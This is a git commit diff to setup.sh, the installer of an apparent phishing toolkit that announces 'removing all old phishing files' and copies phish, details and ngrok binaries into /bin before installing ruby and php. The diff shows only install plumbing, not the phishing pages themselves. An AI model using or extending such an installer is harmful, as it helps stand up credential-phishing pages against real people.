8585aedb24a07b3c63d389ebb44a972b2648976d
karansharmahr <63999241+karansharmahr@users.noreply.github.com>
2021-07-08 10:10:11 +0530

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -1,27 +1,12 @@
 #! /bin/bash
-cd 
-rm -rf ngrok
-cd /data/data/com.termux/files/usr/bin
-rm -rf ngrok
-rm -rf phish
-rm -rf details
 echo "removing all old phishing files"
 sleep 10
-cd 
-cd Phishing
-cp -r details /data/data/com.termux/files/usr/bin
-cp -r phish /data/data/com.termux/files/usr/bin
-cd /data/data/com.termux/files/usr/bin
-chmod 775 phish
-chmod 775 details
-cd
-cd Phishing
-cp -r ngrok /data/data/com.termux/files/usr/bin
-cd /data/data/com.termux/files/usr/bin
-chmod 775 ngrok
-cd 
-
-cd Phishing
+cp -r details /bin
+cp -r phish /bin
+cp -r ngrok /bin
+chmod 775 /bin/phish
+chmod 775 /bin/details
+chmod 775 /bin/ngrok
 echo "installing files"
 sleep 10
 mkdir WebPages
@@ -40,11 +25,10 @@ rm -rf WebPages1.zip
 rm -rf games.zip
 rm -rf WebPages2.zip
 rm -rf WebPages3.zip
-cd
 chmod +x *
-pkg install ruby -y
+apt-get install ruby -y
 gem install lolcat -y
-pkg install php -y
+apt-get install php -y
 
 
 
